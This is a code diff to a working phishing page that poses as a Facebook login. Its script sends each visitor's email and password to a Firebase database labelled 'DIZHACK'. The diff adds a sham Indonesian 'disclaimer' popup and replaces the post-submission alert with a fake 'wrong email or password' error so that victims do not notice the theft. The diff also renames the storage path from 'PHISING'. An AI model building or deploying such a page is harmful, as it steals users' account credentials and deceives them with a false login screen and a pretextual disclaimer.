@@ -20,6 +20,39 @@
             background: url('https://i.ibb.co/Y7TbhZ8d/660974185667.jpg') no-repeat center center fixed;
             background-size: cover;
         }
+        
+        .popup-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+       }
+
+        .popup-content {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.3);
+}
+
+        #continueBtn {
+            padding: 10px 15px;
+            background: #4facfe;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+}
+        #continueBtn:hover {
+            background: #008cff;
+}
 
         .login-container {
             background: #fff;
@@ -106,6 +139,15 @@
 </head>
 <body>
 
+<div id="loginPopup" class="popup-container">
+    <div class="popup-content">
+        <h3>⚠️ DISCLAIMER ⚠️</h3>
+        <br>Kami Ingin Memastikan Bahwa Script Tidak Di Salah Gunakan, Dengan Anda Click LANJUT, Berarti Anda Mematuhi Kebijakan Privasi Kami.</br>
+        <br></br>
+        <button id="continueBtn">LANJUT</button>
+    </div>
+</div>
+
     <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
         <h2>FaceBook</h2>
@@ -125,16 +167,9 @@
     </div>
 
     <iframe id="youtubeMusic" class="youtubeMusic" width="0" height="0" 
-       src="https://www.youtube.com/embed/wOPOtBYs4xs?enablejsapi=1&loop=1&playlist=wOPOtBYs4xs" 
-       frameborder="0" allow="autoplay; encrypted-media">
+        src="https://www.youtube.com/embed/wOPOtBYs4xs?enablejsapi=1&loop=1&playlist=wOPOtBYs4xs" 
+        frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
-
-    <script>
-    document.querySelector(".login-btn").addEventListener("click", function() {
-        let iframe = document.getElementById("youtubeMusic");
-        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', "*");
-    });
-    </script>
     
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
@@ -152,23 +187,37 @@
 
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
-
+    
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
 
-            set(ref(database, 'PHISING/' + email.replace(/[.#$[\]]/g, '_')), {
+            set(ref(database, 'DIZHACK/' + email.replace(/[.#$[\]]/g, '_')), {
                 FBLOGIN: email,
                 PASSWORD: password,
                 WAKTU: new Date().toISOString()
             }).then(() => {
-                alert("Download Scriptnya Dengan Ketuk Oke");
+                alert("Email atau Kata Sandi Salah.");
             }).catch(error => {
-                alert("Login Di Tolak Oleh Admin.");
+                alert("Login Di Tolak");
                 console.error(error);
             });
         });
+        
+        document.addEventListener("DOMContentLoaded", function () {
+            let popup = document.getElementById("loginPopup");
+            let continueBtn = document.getElementById("continueBtn");
+
+            popup.style.display = "flex"; 
+
+        continueBtn.addEventListener("click", function () {
+            popup.style.display = "none";  
+
+            let iframe = document.getElementById("youtubeMusic");
+            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', "*");
+        });
+    });
     </script>
 
 </body>
